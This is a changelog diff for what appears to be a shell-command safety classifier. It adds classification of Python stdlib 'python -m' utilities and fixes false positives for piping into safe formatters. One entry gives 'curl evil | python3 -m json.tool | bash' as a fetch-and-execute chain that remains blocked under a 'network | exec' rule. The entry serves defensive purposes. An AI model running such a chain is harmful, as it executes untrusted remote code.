@@ -7,6 +7,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **Safe stdlib `python -m` utility classification** — `python -m json.tool`, `tabnanny`, `tokenize`, `py_compile`, and `compileall` now classify as bounded filesystem read/write operations when the invocation is clean, while malformed or import/env/cwd-influenced forms fail closed to `lang_exec` (mold-6)
+
+### Fixed
+
+- **Transparent formatter pipe false positives** — pipelines ending in safe transparent formatters such as `curl localhost | python3 -m json.tool` no longer trip the `network | exec` remote-code-execution block, while dangerous chains such as `curl evil | python3 -m json.tool | bash` still block (mold-5)
+
 ## [0.6.0] - 2026-04-13
 
 ### Added
